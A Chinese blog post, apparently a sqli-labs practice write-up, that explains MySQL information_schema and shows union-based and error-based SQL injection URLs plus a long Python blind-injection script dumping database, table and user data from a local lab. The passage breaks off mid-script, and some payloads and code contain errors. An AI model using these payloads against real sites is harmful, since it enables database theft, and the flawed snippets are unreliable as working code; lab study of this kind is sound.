<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>巩固sql注入</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>The clown is laughing at you</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>巩固sql注入</h1><h2 class="headline">Jan 28, 2019 3:11·6.1k words
·27 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-text">0x04</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-lab-7"><span class="toc-text">sqli-lab 7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file"><span class="toc-text">load_file()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select-…-into-outfile"><span class="toc-text">select … into outfile</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-lab-17"><span class="toc-text">sqli-lab 17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-20"><span class="toc-text">sqlilab-20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-23"><span class="toc-text">sqlilab-23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-24"><span class="toc-text">sqlilab-24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-25"><span class="toc-text">sqlilab-25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-25a"><span class="toc-text">sqlilab-25a</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-32"><span class="toc-text">sqlilab-32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-34"><span class="toc-text">sqlilab-34</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-38-堆叠注入"><span class="toc-text">sqlilab-38(堆叠注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-42"><span class="toc-text">sqlilab-42</span></a></li></div><section id="post-body"><p><strong>0x01 认证绕过</strong><br>sqlilab 1<br>整个注入的流程：<br>数据库名–&gt;数据表名–&gt;字段名–&gt;数据名</p>
<p>此次的实验平台是sqlilab的第一题，我个人觉得第一题虽然最为简单，但是却最为重要，毕竟万事开头难嘛。<br>这里补充一些关于mysql的知识点：<br>mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表</p>
<p><strong>SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</strong></p>
<p><strong>TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</strong></p>
<p><strong>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables存储了数据表的元数据信息，下面对常用的字段进行介绍：</span><br><span class="line">table_schema: 记录数据库名；</span><br><span class="line">table_name: 记录数据表名；</span><br><span class="line">engine : 存储引擎；</span><br><span class="line">table_rows: 关于表的粗略行估计；</span><br><span class="line">data_length : 记录表的大小（单位字节）；</span><br><span class="line">index_length : 记录表的索引的大小；</span><br><span class="line">row_format: 可以查看数据表是否压缩过；</span><br></pre></td></tr></table></figure>
<p>我们先爆出数据所在的数据表的列数<br>    <code>http://localhost/sqlilab/Less-1/?id=1&#39; order by  4 --+</code><br><img src="/2019/01/28/巩固sql注入/1.png" alt="1"></p>
<p>发现错误，那么我们试试<br>    <code>http://localhost/sqlilab/Less-1/?id=1&#39; order by  3 --+</code><br><img src="/2019/01/28/巩固sql注入/2.png" alt="1"></p>
<p>说明有三列，那么接下来我们爆出它的数据库名，这道题是比较简单的认证绕过，因为源码中没有任何过滤所以就可以为所欲为。<br>爆它的数据库名：<br>   <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,database(),version()--+</code><br><img src="/2019/01/28/巩固sql注入/3.png" alt="1"></p>
<p>数据库名已出，那么接下来爆出它的表名<br>   <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from  information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="/2019/01/28/巩固sql注入/4.png" alt="1"></p>
<p>数据表名已出，接下来爆出它的字段名（我们这里爆email的字段名）<br>    <code>http://localhost/sqlilab/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27emails%27--+</code><br><img src="/2019/01/28/巩固sql注入/5.png" alt="1"></p>
<p><strong>之前爆不出数据表users的字段名：这下我发现正确的爆库payload是：</strong><br>    <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from  information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
<p>爆数据<br>    <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select id,email_id,3 from emails where id=1 --+</code><br><img src="/2019/01/28/巩固sql注入/6.png" alt="1"></p>
<p>这就出来了，实际上这里有些东西是可以通过脚本来进行自动化注入。<br>（剩下的2,3,4题观察其源码就知道稍微修改就好）</p>
<p><strong>0x02</strong><br>sqlilab 5<br>这道题有两个解法，一个是通过双注入，一个是通过盲注脚本<br>先讲第一个解法，通过双注入来完成注入，这里要补充一下mysql的一些知识：</p>
<p>先来一个很简单的例子：<br>select concat(select database());<br>这就是一个简单的双查询的过程，简单理解的情况下就是查询该数据库，通过concat()函数，concat()这个函数用于连接前后两个字符串，比如concat(‘a’,’b’)，结果就是ab.</p>
<p>学习几个常见双注入需要的函数/语法：</p>
<ol>
<li>Rand() //随机函数 </li>
<li>Floor() //取整函数</li>
<li>Count() //汇总函数</li>
<li>Group by clause //分组语句</li>
</ol>
<p>代码一：<br><img src="/2019/01/28/巩固sql注入/7.png" alt="1"></p>
<p>代码二：<br><img src="/2019/01/28/巩固sql注入/8.png" alt="1"></p>
<p>代码三：<br><img src="/2019/01/28/巩固sql注入/9.png" alt="1"></p>
<p>代码四：（在上面的代码加入from将会返回一个集合）<br><img src="/2019/01/28/巩固sql注入/10.png" alt="1"></p>
<p>代码五：（加入group by,使得相同的值被分到同一个分组）<br><img src="/2019/01/28/巩固sql注入/11.png" alt="1"></p>
<p>代码六：最后一步，在concat前加入聚合函数 count(*)<br><img src="/2019/01/28/巩固sql注入/12.png" alt="1"></p>
<p>现在我们来了解这道题，首先爆出列数，按照最简单的payload来<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br><img src="/2019/01/28/巩固sql注入/13.png" alt="1"><br>发现出现问题了，所以现在我们就可以去试出它的列数为3，<br>所以正确的payload为：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2，concat(&#39;*&#39;,(select, database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br>我们可以爆出它的数据库名为：<br><img src="/2019/01/28/巩固sql注入/14.png" alt="1"></p>
<p>爆出其数据表名：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br><img src="/2019/01/28/巩固sql注入/15.png" alt="1"></p>
<p>爆出其字段名：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;*&#39;,floor(rand(0)*2))as a from information_schema.tables group by a --+</code></p>
<p>接下来就按照常规的操作来获取其数据值：(可写脚本通过自动化注入)<br>    <code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><strong>0x03</strong></h2><p>sqlilab 5（盲注）<br>这道题，这次使用盲注，我们通过认证绕过的payload会发现，如果注入成功，将会返回“You are in………”<br>关于布尔盲注的知识稍后再进行补充<br>放上脚本，我是把整个过程拆块儿进行：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x01</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名的长度</span></span><br><span class="line"><span class="comment">#获取链接</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"--------------------------------------------------------"</span>)</span><br><span class="line">print(<span class="string">"开始获取数据库长度......"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(length(database())=%d)--+"</span>%x</span><br><span class="line"><span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line">    </span><br><span class="line"><span class="comment">#使用正则表达式判断demo中是否有与 "you are in ......" 相匹配的内容</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      ans = re.compile(<span class="string">"You are in"</span>).search(demo)<span class="comment">#检测是否匹配到相关信息</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'fail to match'</span>  </span><br><span class="line">    <span class="keyword">if</span> ans == <span class="keyword">None</span>:<span class="comment">#判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'waiting for a moment........'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the length of database is  %d'</span>%x</span><br><span class="line">        db_length = x</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取数据库长度成功"</span></span><br><span class="line">        print(<span class="string">"--------------------------------------------------------"</span>)</span><br><span class="line">        <span class="keyword">break</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名称</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"开始获取数据库名......"</span></span><br><span class="line"><span class="comment">#获取链接</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line">db_list=[]<span class="comment">#该列表用于存储获取到的数据库的字符</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,db_length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> list:</span><br><span class="line">      url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(substr(database(),%d,1)='%%s')--+"</span>%x %y<span class="comment">#这里注意使用%%s转义</span></span><br><span class="line"><span class="comment">#获取页面内容</span></span><br><span class="line">      r = requests.get(url)</span><br><span class="line">      r.encoding = r.apparent_encoding</span><br><span class="line">      demo = r.text</span><br><span class="line"><span class="comment">#对获取到的页面信息进行正则表达式匹配</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          ans = re.compile(<span class="string">"You are in"</span>).search(demo)  <span class="comment"># 检测是否匹配到相关信息</span></span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">          <span class="keyword">print</span> <span class="string">'fail to match'</span></span><br><span class="line">      <span class="keyword">if</span> ans != <span class="keyword">None</span>:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">          <span class="keyword">print</span> <span class="string">'the true letter of database is %s'</span> % y</span><br><span class="line">          <span class="keyword">print</span> <span class="string">'获取第%d个字母成功'</span> % x</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    db_list.append(y)</span><br><span class="line">db_name = <span class="string">""</span>.join(db_list)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"the name of database is  "</span>+ db_name</span><br><span class="line"><span class="keyword">print</span> <span class="string">"获取数据库名成功"</span></span><br><span class="line">print(<span class="string">"--------------------------------------------------------"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取该数据库中的数据表数目</span></span><br><span class="line"><span class="comment">#获取链接</span></span><br><span class="line">db_name = <span class="string">'security'</span></span><br><span class="line">print(<span class="string">"开始获取该数据库中的数据表数目......"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="comment">#这里又一个转义的问题需要关注</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(( SELECT count(*)  FROM information_schema.tables WHERE TABLE_SCHEMA = '%s')='%d')--+"</span>%(db_name , x)</span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式判断demo中是否有与 "you are in ......" 相匹配的内容</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ans = re.compile(<span class="string">"You are in"</span>).search(demo)  <span class="comment"># 检测是否匹配到相关信息</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'fail to match'</span></span><br><span class="line">    <span class="keyword">if</span> ans != <span class="keyword">None</span>:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the number of tables is  %d'</span> % x</span><br><span class="line">        table_count = x</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取数据库表数目成功"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'数据库表的数目不是%d'</span>%x     </span><br><span class="line"><span class="keyword">print</span> <span class="string">'获取数据库表数目成功,数目为%d'</span>%table_count        </span><br><span class="line"></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line"><span class="comment">#获取数据库表,各个数据表名的长度以及数据表名</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,table_count):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取第%d个表的长度.....'</span>%x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT table_name FROM information_schema.tables WHERE TABLE_SCHEMA = '%s' limit %d,1),%d,1)))--+"</span>%(db_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">            _table_length = y<span class="number">-1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'获取到此表的长度为:%d'</span>%_table_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取该表的表名'</span></span><br><span class="line">    table_name=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,_table_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> list:</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(substr((SELECT table_name FROM information_schema.tables where table_schema = '%s' limit %d,1),%d,1) = '%s')--+"</span>%(db_name,x,y,z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">               table_name.append(z)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">    tb_name = <span class="string">""</span>.join(table_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'该表的名字为:'</span>+tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x02</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">table_name = <span class="string">'users'</span></span><br><span class="line"><span class="comment">#获取该表中的列数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id= 1'and ((select count(column_name) from information_schema.columns where table_name = '%s')=%d) --+"</span> % (table_name, i)</span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the number of columns is  %d'</span> % i</span><br><span class="line">        column_count = i</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取数据表列数目成功"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'获取%s表列数目成功,数目为%d'</span> % (table_name, column_count)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取列的长度</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,column_count):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取第%d个列的长度.....'</span>%x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name = '%s' limit %d,1),%d,1)))--+"</span>%(table_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">            _column_length = y<span class="number">-1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'获取到此列的长度为:%d'</span>%_column_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库表中各列的名称</span></span><br><span class="line">    column_name=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, _column_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> list:</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(substr((SELECT column_name FROM information_schema.columns where table_name = '%s' limit %d,1),%d,1) = '%s')--+"</span> % (table_name, x, y, z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                column_name.append(z)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    co_name = <span class="string">""</span>.join(column_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'该列的名字为:'</span> + co_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x03</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">database_name = <span class="string">'security'</span></span><br><span class="line">table_name = <span class="string">'users'</span></span><br><span class="line">column_name = <span class="string">'username'</span></span><br><span class="line"><span class="comment">#获取该列的字段数目</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id= 1'and ((select count(%s) from %s.%s)=%d) --+"</span> % (column_name,database_name,table_name,i)</span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:  <span class="comment">#</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the number of 该字段 is  %d'</span> % i</span><br><span class="line">        all_column_count = i</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取字段总数目成功,数目是:%d"</span>%all_column_count</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取字段的长度</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,all_column_count):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取第%d个字段的长度.....'</span>%x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT %s FROM %s.%s limit %d,1),%d,1)))--+"</span>%(column_name,database_name,table_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">            dump_length = y<span class="number">-1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'获取到此字段的长度为:%d'</span>%dump_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取该字段内容</span></span><br><span class="line">    dump_name=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, dump_length<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT %s FROM %s.%s limit %d,1),%d,1)) = %d)--+"</span> %(column_name,database_name,table_name, x, y, z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                t=chr(z)  </span><br><span class="line">                dump_name.append(t)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    